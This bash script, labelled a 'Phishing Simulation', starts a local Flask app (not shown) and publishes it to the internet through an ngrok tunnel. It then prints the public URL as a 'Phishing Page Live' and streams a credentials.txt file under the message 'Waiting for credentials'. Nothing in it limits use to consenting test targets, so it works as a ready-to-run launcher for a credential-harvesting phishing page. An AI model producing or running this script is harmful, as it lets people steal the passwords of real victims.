#!/bin/bash

echo "[*] Starting Phishing Simulation..."

# Install dependencies
pip3 install -r requirements.txt

# Start Flask server in background
export FLASK_APP=app.py
flask run --host=127.0.0.1 --port=5000 > /dev/null 2>&1 &

FLASK_PID=$!

# Launch ngrok
if ! command -v ngrok &> /dev/null; then
    echo "[!] Ngrok not found. Please install ngrok."
    kill $FLASK_PID
    exit 1
fi

ngrok http 5000 > /dev/null &
sleep 5

NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io')

if [[ -z "$NGROK_URL" ]]; then
    echo "[!] Ngrok tunnel failed."
    kill $FLASK_PID
    exit 1
fi

echo "[+] Phishing Page Live at: $NGROK_URL"
echo "[*] Waiting for credentials..."

trap "echo '[*] Terminating...'; kill $FLASK_PID; pkill ngrok; exit 0" SIGINT

tail -f captured_data/credentials.txt

